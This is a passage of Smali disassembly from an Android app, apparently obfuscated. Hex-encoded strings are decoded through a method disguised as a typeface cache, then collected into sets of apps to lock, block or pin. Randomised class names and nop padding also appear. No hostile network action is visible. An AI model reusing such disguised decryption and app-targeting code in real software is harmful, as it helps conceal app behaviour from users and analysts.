    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 330
    .line 331
    .line 332
    move-result-object v31

    nop

    nop

    .line 333
    const-string v0, "003100630015008A00E400AC009C00AA002C0078005E009E"

    .line 334
    .line 335
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 336
    .line 337
    .line 338
    move-result-object v32

    .line 339
    const-string v0, "003100630015008500E000BC009C00AA002C00740052008B00F500BD00D300A900280038004F00D6"

    .line 340
    .line 341
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 342
    .line 343
    .line 344
    move-result-object v33

    .line 345
    const-string v0, "00200079005600C900E000B000C100B3002100770055008C"

    .line 346
    .line 347
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 348
    .line 349
    .line 350
    move-result-object v34

    .line 351
    const-string v0, "003100630015008500F100B100D100A6002A0078004F008200E300BE009C00AA002C00740052008B00F500F100D300A9002700640054008E00F4"

    .line 352
    .line 353
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 354
    .line 355
    .line 356
    move-result-object v35

    nop

    nop

    .line 357
    const-string v0, "003100630015008B00F500AB00DD00A500220078005000C900D300B000C100AA002C0065"

    .line 358
    .line 359
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 360
    .line 361
    .line 362
    move-result-object v36

    .line 363
    const-string v0, "003100630015008F00FF00B200D700A400310073005F008E00E400F100DF00BE00200064005E008300F900AB"

    nop

    nop

    .line 364
    .line 365
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 366
    .line 367
    .line 368
    move-result-object v37

    .line 369
    const-string v0, "003100630015009400F200BA00C000A5002200780050008A00FF00BD00DB00AB002600380054008900FC00B600DC00A2"

    .line 370
    .line 371
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 372
    .line 373
    .line 374
    move-result-object v38

    .line 375
    const-string v0, "003100630015009500FF00BC00D900A200370074005A008900FB00F100C000F500270024"

    nop

    nop

    .line 376
    .line 377
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 378
    .line 379
    .line 380
    move-result-object v39

    .line 381
    const-string v0, "003100630015009300FF00BC00DA00AC002200380059008600FE00B4009C00A600330066"

    .line 382
    .line 383
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 384
    .line 385
    .line 386
    move-result-object v40

    .line 387
    const-string v0, "00200079005600C900E000BE00CB00B70022007A0015008600FE00BB00C000A8002A00720015009700A200AF00DF00A80021007F00570082"

    .line 388
    .line 389
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 390
    .line 391
    .line 392
    move-result-object v41

    nop

    .line 393
    const-string v0, "003100630015009600F900A800DB00E9003400770057008B00F500AB"

    .line 394
    .line 395
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 396
    .line 397
    .line 398
    move-result-object v42

    .line 399
    const-string v0, "003100630015009E00FF00B000DF00A8002D0073004200C900F100AF00C2"

    .line 400
    .line 401
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 402
    .line 403
    .line 404
    move-result-object v43

    .line 405
    const-string v0, "00200079005600C900E200BA00C400A8002F0063004F00C900E200BA00C400A8002F0063004F"

    .line 406
    .line 407
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 408
    .line 409
    .line 410
    move-result-object v44

    .line 411
    const-string v0, "00200079005600C900E400AD00D300A900300070005E009500E700B600C100A2006D00770055008300E200B000DB00A3"

    .line 412
    .line 413
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 414
    .line 415
    .line 416
    move-result-object v45

    .line 417
    const-string v0, "00200079005600C900E600BA00DC00AA002C"

    nop

    nop

    .line 418
    .line 419
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 420
    .line 421
    .line 422
    move-result-object v46

    .line 423
    const-string v0, "00200079005600C900E700BE00DE00AB002600620015008400E200A600C200B3002C0038004F009500E500AC00C600A600330066"

    .line 424
    .line 425
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 426
    .line 427
    .line 428
    move-result-object v47

    .line 429
    const-string v0, "002A00790015008A00F500AB00D300AA002200650050"

    .line 430
    .line 431
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 432
    .line 433
    .line 434
    move-result-object v48

    .line 435
    const-string v0, "00200079005600C900F200B600DC00A6002D0075005E00C900F400BA00C4"

    .line 436
    .line 437
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 438
    .line 439
    .line 440
    move-result-object v49

    .line 441
    const-string v0, "00200079005600C900F300B000DB00A9002100770048008200BE00BE00DC00A30031007900520083"

    .line 442
    .line 443
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 444
    .line 445
    .line 446
    move-result-object v50

    .line 447
    const-string v0, "0033007F004E008C00BE00BD00DE00A80020007D0058008F00F100B600DC00E900220078005F009500FF00B600D6"

    .line 448
    .line 449
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 450
    .line 451
    .line 452
    move-result-object v51

    .line 453
    const-string v0, "00200079005600C900F200A600D000AE00370038005A009700E0"

    .line 454
    .line 455
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 456
    .line 457
    .line 458
    move-result-object v52

    .line 459
    const-string v0, "00200079005600C900FB00AA00D100A8002A00780015008A00F100AD00D900A20037"

    .line 460
    .line 461
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 462
    .line 463
    .line 464
    move-result-object v53

    .line 465
    const-string v0, "0026006E0054008300E500AC00DF00A8003500730056008200FE00AB009C00A2003B0079005F009200E3"

    .line 466
    .line 467
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 468
    .line 469
    .line 470
    move-result-object v54

    .line 471
    const-string v0, "002A00790015009400F100B900D700B70022007A0015009000F100B300DE00A20037"

    .line 472
    .line 473
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 474
    .line 475
    .line 476
    move-result-object v55

    .line 477
    const-string v0, "00200079005600C900E400B000DC009800280073005E009700F500AD"

    nop

    .line 478
    .line 479
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 480
    .line 481
    .line 482
    move-result-object v56

    .line 483
    const-string v0, "00200079005600C900FD00A600C600A8002D0061005A008B00FC00BA00C600E900220066004B"

    .line 484
    .line 485
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 486
    .line 487
    .line 488
    move-result-object v57

    .line 489
    filled-new-array/range {v1 .. v57}, [Ljava/lang/String;

    .line 490
    .line 491
    .line 492
    move-result-object v0

    .line 493
    invoke-static {v0}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 494
    .line 495
    .line 496
    move-result-object v0

    nop

    nop

    .line 497
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->autoEnablePinPackages:Ljava/util/Set;

    .line 498
    .line 499
    new-instance v0, Ljava/util/LinkedHashSet;

    .line 500
    .line 501
    invoke-direct {v0}, Ljava/util/LinkedHashSet;-><init>()V

    .line 502
    .line 503
    .line 504
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockedApps:Ljava/util/Set;

    .line 505
    .line 506
    new-instance v0, Ljava/util/LinkedHashSet;

    .line 507
    .line 508
    invoke-direct {v0}, Ljava/util/LinkedHashSet;-><init>()V

    .line 509
    .line 510
    .line 511
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->blockedApps:Ljava/util/Set;

    nop

    .line 512
    .line 513
    new-instance v0, Ljava/util/LinkedHashSet;

    .line 514
    .line 515
    invoke-direct {v0}, Ljava/util/LinkedHashSet;-><init>()V

    .line 516
    .line 517
    .line 518
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->autoLockedApps:Ljava/util/Set;

    .line 519
    .line 520
    const-string v0, "00200079005600C900FD00B600C700AE006D0065005E008400E500AD00DB00B3003A0075005E008900E400BA00C0"

    .line 521
    .line 522
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 523
    .line 524
    .line 525
    move-result-object v1

    .line 526
    const-string v0, "00200079005600C900FD00B600C700AE006D0065005E008400E500AD00DB00B3003A0077005F0083"

    .line 527
    .line 528
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 529
    .line 530
    .line 531
    move-result-object v2

    .line 532
    const-string v0, "00200079005600C900FD00B600C700AE006D00750057008200F100B100DF00A600300062005E0095"

    .line 533
    .line 534
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 535
    .line 536
    .line 537
    move-result-object v3

    .line 538
    const-string v0, "00200079005600C900FD00B600C700AE006D0066005E009500FD00BC00D700A9003700730049"

    .line 539
    .line 540
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 541
    .line 542
    .line 543
    move-result-object v4

    .line 544
    const-string v0, "00200079005600C900FD00B600C700AE006D0071004E008600E200BB00C200B5002C00600052008300F500AD"

    .line 545
    .line 546
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 547
    .line 548
    .line 549
    move-result-object v5

    .line 550
    const-string v0, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900FC00B000DD00AB"

    .line 551
    .line 552
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 553
    .line 554
    .line 555
    move-result-object v6

    .line 556
    const-string v0, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900E300B2"

    .line 557
    .line 558
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 559
    .line 560
    .line 561
    move-result-object v7

    .line 562
    const-string v0, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900F100AF00C200AB002C00750050"

    .line 563
    .line 564
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 565
    .line 566
    .line 567
    move-result-object v8

    .line 568
    const-string v0, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900E600B000D1"

    .line 569
    .line 570
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 571
    .line 572
    .line 573
    move-result-object v9

    .line 574
    const-string v0, "00200079005600C900F800AA00D300B00026007F0015009400E900AC00C600A2002E007B005A008900F100B800D700B5"

    .line 575
    .line 576
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 577
    .line 578
    .line 579
    move-result-object v10

    .line 580
    const-string v11, "00200079005600C900F800AA00D300B00026007F0015009700F500AD00DF00AE003000650052008800FE00B200D300A900220071005E0095"

    .line 581
    .line 582
    invoke-static {v11}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 583
    .line 584
    .line 585
    move-result-object v11

    .line 586
    const-string v12, "00200079005600C900F300B000DE00A800310079004800C900E300BE00D400A2002000730055009300F500AD"

    nop

    .line 587
    .line 588
    invoke-static {v12}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 589
    .line 590
    .line 591
    move-result-object v12

    .line 592
    const-string v13, "00200079005600C900FF00AF00DE00B2003000380048008600F600BA00D100A2002D0062005E0095"

    nop

    .line 593
    .line 594
    invoke-static {v13}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 595
    .line 596
    .line 597
    move-result-object v13

    .line 598
    const-string v14, "00200079005600C900F800BA00CB00B3002200660015009400FD00BE00C000B3002B007900560082"

    .line 599
    .line 600
    invoke-static {v14}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 601
    .line 602
    .line 603
    move-result-object v14

    nop

    nop

    .line 604
    const-string v15, "00200079005600C900F300B000DE00A800310079004800C900E000B700DD00A90026007B005A008900F100B800D700B5"

    .line 605
    .line 606
    invoke-static {v15}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 607
    .line 608
    .line 609
    move-result-object v15

    .line 610
    const-string v16, "00200079005600C900F900AE00DD00A8006D0065005E008400E500AD00D7"

    .line 611
    .line 612
    invoke-static/range {v16 .. v16}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 613
    .line 614
    .line 615
    move-result-object v16

    .line 616
    const-string v17, "00200079005600C900E600B600C400A8006D0066005E009500FD00B600C100B4002A00790055008A00F100B100D300A000260064"

    .line 617
    .line 618
    invoke-static/range {v17 .. v17}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 619
    .line 620
    .line 621
    move-result-object v17

    .line 622
    const-string v18, "00200079005600C900E600B600C400A8006D007700590082"

    nop

    nop

    .line 623
    .line 624
    invoke-static/range {v18 .. v18}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 625
    .line 626
    .line 627
    move-result-object v18

    .line 628
    const-string v19, "00200079005600C900FF00B100D700B7002F0063004800C900E300BA00D100B20031007F004F009E"

    .line 629
    .line 630
    invoke-static/range {v19 .. v19}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 631
    .line 632
    .line 633
    move-result-object v19

    .line 634
    const-string v20, "00200079005600C900E400AD00D300A9003000650052008800FE00F100C200AF002C0078005E008A00F100B100D300A000260064"

    .line 635
    .line 636
    invoke-static/range {v20 .. v20}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 637
    .line 638
    .line 639
    move-result-object v20

    .line 640
    const-string v21, "00200079005600C900E400AD00D300A9003000650052008800FE00F100C100BE00300062005E008A00FD00BE00DC00A6002400730049"

    .line 641
    .line 642
    invoke-static/range {v21 .. v21}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 643
    .line 644
    .line 645
    move-result-object v21

    .line 646
    const-string v22, "00200079005600C900E400AD00D300A9003000650052008800FE00F100C100A2002000630049008E00E400A6"

    nop

    .line 647
    .line 648
    invoke-static/range {v22 .. v22}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 649
    .line 650
    .line 651
    move-result-object v22

    .line 652
    const-string v23, "00200079005600C900E400AD00D300A9003000650052008800FE00F100D300B70033007B005A008900F100B800D700B5"

    .line 653
    .line 654
    invoke-static/range {v23 .. v23}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 655
    .line 656
    .line 657
    move-result-object v23

    .line 658
    const-string v24, "00200079005600C900F900AB00D700AB006D00660053008800FE00BA00DF00A600300062005E0095"

    .line 659
    .line 660
    invoke-static/range {v24 .. v24}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 661
    .line 662
    .line 663
    move-result-object v24

    .line 664
    const-string v25, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008600E000AF00C100E9003400730057008B00F200BA00DB00A90024"

    .line 665
    .line 666
    invoke-static/range {v25 .. v25}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 667
    .line 668
    .line 669
    move-result-object v25

    .line 670
    const-string v26, "00200079005600C900FD00B600C700AE006D00700052008B00F500BA00CA00B7002F00790049008200E2"

    .line 671
    .line 672
    invoke-static/range {v26 .. v26}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 673
    .line 674
    .line 675
    move-result-object v26

    .line 676
    const-string v27, "00200079005600C900F300B000DE00A800310079004800C900F600B600DE00A2002E00770055008600F700BA00C0"

    nop

    .line 677
    .line 678
    invoke-static/range {v27 .. v27}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 679
    .line 680
    .line 681
    move-result-object v27

    .line 682
    const-string v28, "00200079005600C900F800AA00D300B00026007F0015008100F900B300D700AA00220078005A008000F500AD"

    .line 683
    .line 684
    invoke-static/range {v28 .. v28}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 685
    .line 686
    .line 687
    move-result-object v28

    .line 688
    const-string v29, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900FD00A600D400AE002F00730048"

    .line 689
    .line 690
    invoke-static/range {v29 .. v29}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 691
    .line 692
    .line 693
    move-result-object v29

    .line 694
    const-string v30, "00200079005600C900F100AC00C700B4006D00700052008B00F500B200D300A900220071005E0095"

    .line 695
    .line 696
    invoke-static/range {v30 .. v30}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 697
    .line 698
    .line 699
    move-result-object v30

    .line 700
    const-string v31, "00200079005600C900FC00B000DC00A2002F006F0058008600E400B800D300AA002600650015009F00E000B300DD00B50026"

    .line 701
    .line 702
    invoke-static/range {v31 .. v31}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 703
    .line 704
    .line 705
    move-result-object v31

    .line 706
    const-string v32, "00200079005600C900F700B700DB00B4002F0073004900C900F100B100D600B5002C007F005F00C900C400B000C600A6002F00550054008A00FD00BE00DC00A300260064"

    .line 707
    .line 708
    invoke-static/range {v32 .. v32}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 709
    .line 710
    .line 711
    move-result-object v32

    .line 712
    const-string v33, "00200079005600C900F500AC00C600B5002C0078005C009400BE00BE00DC00A3003100790052008300BE00AF00DD00B7"

    .line 713
    .line 714
    invoke-static/range {v33 .. v33}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 715
    .line 716
    .line 717
    move-result-object v33

    .line 718
    const-string v34, "00200079005600C900F100B300C200AF0022007F0055009100F500B100C600A800310038005D008E00FC00BA00DF00A6002D0077005C008200E2"

    .line 719
    .line 720
    invoke-static/range {v34 .. v34}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 721
    .line 722
    .line 723
    move-result-object v34

    .line 724
    const-string v35, "003100630015009D00F400BA00C400B4006D006C005A009500F300B700DB00B100260064"

    .line 725
    .line 726
    invoke-static/range {v35 .. v35}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 727
    .line 728
    .line 729
    move-result-object v35

    .line 730
    const-string v36, "00200079005600C900FD00B600CA00B7002F00790049008200E200F100C100AE002F0060005E0095"

    .line 731
    .line 732
    invoke-static/range {v36 .. v36}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 733
    .line 734
    .line 735
    move-result-object v36

    .line 736
    const-string v37, "00200079005600C900F100B200D300BD00260038005D008E00FC00BA00DF00A6002D0077005C008200E2"

    .line 737
    .line 738
    invoke-static/range {v37 .. v37}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 739
    .line 740
    .line 741
    move-result-object v37

    .line 742
    const-string v38, "00200079005600C900F100B100D600B5002C007F005F00C900E600BA00DC00A3002A0078005C"

    .line 743
    .line 744
    invoke-static/range {v38 .. v38}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 745
    .line 746
    .line 747
    move-result-object v38

    .line 748
    const-string v39, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008100F900B100C100AC003A"

    .line 749
    .line 750
    invoke-static/range {v39 .. v39}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 751
    .line 752
    .line 753
    move-result-object v39

    .line 754
    const-string v40, "00200079005600C900E300BA00D100E900220078005F009500FF00B600D600E900220066004B00C900E300BE00DF00B400360078005C008600E000AF00C1"

    .line 755
    .line 756
    invoke-static/range {v40 .. v40}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 757
    .line 758
    .line 759
    move-result-object v40

    .line 760
    const-string v41, "00200079005600C900F800AA00D300B00026007F0015008600E000AF00DF00A60031007D005E0093"

    .line 761
    .line 762
    invoke-static/range {v41 .. v41}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 763
    .line 764
    .line 765
    move-result-object v41

    .line 766
    const-string v42, "00200079005600C900FF00AF00C200A8006D007B005A009500FB00BA00C6"

    nop

    nop

    .line 767
    .line 768
    invoke-static/range {v42 .. v42}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 769
    .line 770
    .line 771
    move-result-object v42

    .line 772
    const-string v43, "00200079005600C900F800BA00CB00B3002200660015008A00F100AD00D900A20037"

    .line 773
    .line 774
    invoke-static/range {v43 .. v43}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 775
    .line 776
    .line 777
    move-result-object v43

    nop

    .line 778
    const-string v44, "00200079005600C900E800B600D300A8002E007F0015008A00F100AD00D900A20037"

    nop

    .line 779
    .line 780
    invoke-static/range {v44 .. v44}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 781
    .line 782
    .line 783
    move-result-object v44

    .line 784
    const-string v45, "003100630015009100FB00F100C100B3002C0064005E"

    .line 785
    .line 786
    invoke-static/range {v45 .. v45}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 787
    .line 788
    .line 789
    move-result-object v45

    .line 790
    const-string v46, "00200079005600C900E500AF00C600A800270079004C0089"

    .line 791
    .line 792
    invoke-static/range {v46 .. v46}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 793
    .line 794
    .line 795
    move-result-object v46

    .line 796
    const-string v47, "00200079005600C900F100AF00D900B700360064005E00C900F100BA00D500A8002D"

    .line 797
    .line 798
    invoke-static/range {v47 .. v47}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 799
    .line 800
    .line 801
    move-result-object v47

    .line 802
    const-string v48, "002C0064005C00C900F600BB00C000A8002A00720015008100F400AD00DD00AE0027"

    .line 803
    .line 804
    invoke-static/range {v48 .. v48}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 805
    .line 806
    .line 807
    move-result-object v48

    .line 808
    const-string v49, "00200079005600C900F100AA00C000A8003100770015009400E400B000C000A2"

    .line 809
    .line 810
    invoke-static/range {v49 .. v49}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 811
    .line 812
    .line 813
    move-result-object v49

    .line 814
    const-string v50, "00200079005600C900F100AF00C600A8002A0072005E00C900E000BE00C000B3002D007300490094"

    .line 815
    .line 816
    invoke-static/range {v50 .. v50}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 817
    .line 818
    .line 819
    move-result-object v50

    .line 820
    const-string v51, "00200079005600C900F100A900D300B400370038005A008900F400AD00DD00AE002700380056008800F200B600DE00A2003000730058009200E200B600C600BE"

    .line 821
    .line 822
    invoke-static/range {v51 .. v51}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 823
    .line 824
    .line 825
    move-result-object v51

    .line 826
    const-string v52, "00200079005600C900F100A900D500E90020007A005E008600FE00BA00C0"

    .line 827
    .line 828
    invoke-static/range {v52 .. v52}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 829
    .line 830
    .line 831
    move-result-object v52

    .line 832
    const-string v53, "00200079005600C900F100A900DB00B500220038005A008900F400AD00DD00AE0027"

    .line 833
    .line 834
    invoke-static/range {v53 .. v53}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 835
    .line 836
    .line 837
    move-result-object v53

    nop

    nop

    .line 838
    const-string v54, "002C0064005C00C900FD00BE00DE00B000220064005E008500E900AB00D700B4006D00770055009300F900B200D300AB0034007700490082"

    .line 839
    .line 840
    invoke-static/range {v54 .. v54}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 841
    .line 842
    .line 843
    move-result-object v54

    .line 844
    const-string v55, "00200079005600C900F200B600C600A300260070005E008900F400BA00C000E9003000730058009200E200B600C600BE"

    .line 845
    .line 846
    invoke-static/range {v55 .. v55}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 847
    .line 848
    .line 849
    move-result-object v55

    .line 850
    const-string v56, "00200079005600C900FB00B200C100E900250064005E0082"

    .line 851
    .line 852
    invoke-static/range {v56 .. v56}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 853
    .line 854
    .line 855
    move-result-object v56

    .line 856
    const-string v57, "00200079005600C900FB00BE00C100B7002600640048008C00E900F100D900A20030"

    .line 857
    .line 858
    invoke-static/range {v57 .. v57}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 859
    .line 860
    .line 861
    move-result-object v57

    .line 862
    const-string v58, "00200079005600C900F400AD00C500A20021"

    .line 863
    .line 864
    invoke-static/range {v58 .. v58}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 865
    .line 866
    .line 867
    move-result-object v58

    .line 868
    const-string v59, "00200079005600C900F400AD00C500A200210038004B009500FF"

    .line 869
    .line 870
    invoke-static/range {v59 .. v59}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 871
    .line 872
    .line 873
    move-result-object v59

    .line 874
    const-string v60, "00200079005600C900F400AD00C500A200210038004B009500FF00F100DF00A60031007D005E0093"

    .line 875
    .line 876
    invoke-static/range {v60 .. v60}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 877
    .line 878
    .line 879
    move-result-object v60

    nop

    .line 880
    const-string v61, "00200079005600C900F500AC00D700B3006D00730056009400A200F100D500B7"

    .line 881
    .line 882
    invoke-static/range {v61 .. v61}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 883
    .line 884
    .line 885
    move-result-object v61

    .line 886
    const-string v62, "00200079005600C900E300A600DF00A6002D0062005E008400BE00B200DD00A5002A007A005E009400F500BC00C700B5002A00620042"

    nop

    .line 887
    .line 888
    invoke-static/range {v62 .. v62}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 889
    .line 890
    .line 891
